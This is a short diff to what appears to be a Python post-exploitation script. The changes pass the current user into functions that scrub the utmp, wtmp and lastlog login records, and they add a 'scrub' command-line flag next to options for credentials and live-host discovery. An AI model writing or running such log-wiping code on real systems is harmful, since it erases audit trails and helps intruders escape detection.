@@ -35,6 +35,8 @@ import socket
 import random, string
 import logging
 import struct
+import getpass
+import pwd
 
 cut = lambda s: str(s).split("\0",1)[0]
 
@@ -342,11 +344,11 @@ def ScrubLog():
   writeNewFile(UTMP_FILEPATH, newUtmp)
   print "[+] %s cleaned" % UTMP_FILEPATH
   
-  newWtmp = scrubFile(WTMP_FILEPATH)
+  newWtmp = scrubFile(WTMP_FILEPATH, Current_User)
   writeNewFile(WTMP_FILEPATH, newWtmp)
   print "[+] %s cleaned" % WTMP_FILEPATH
 
-  newLastlog = scrubLastlogFile(LASTLOG_FILEPATH)
+  newLastlog = scrubLastlogFile(LASTLOG_FILEPATH, Current_User)
   writeNewFile(LASTLOG_FILEPATH, newLastlog)
   print "[+] %s cleaned" % LASTLOG_FILEPATH
 
@@ -559,7 +561,7 @@ def main(argv):
     # figure out way to run environment() ONLY if a user gives an option
     # or if i must create it anyways, rm -rf the empty directory if it isnt used by commands
     try:
-        opts, args = getopt.getopt(argv, "dhtonlcpa", ["daemon", "help", "tar", "os-info", "network", "live hosts", "credentials", "protection", "scrub", "all-tests"])
+        opts, args = getopt.getopt(argv, "dhtonlcpsa", ["daemon", "help", "tar", "os-info", "network", "live hosts", "credentials", "protection", "scrub", "all-tests"])
     except getopt.GetoptError, err:
         print str(err) 
         usage()
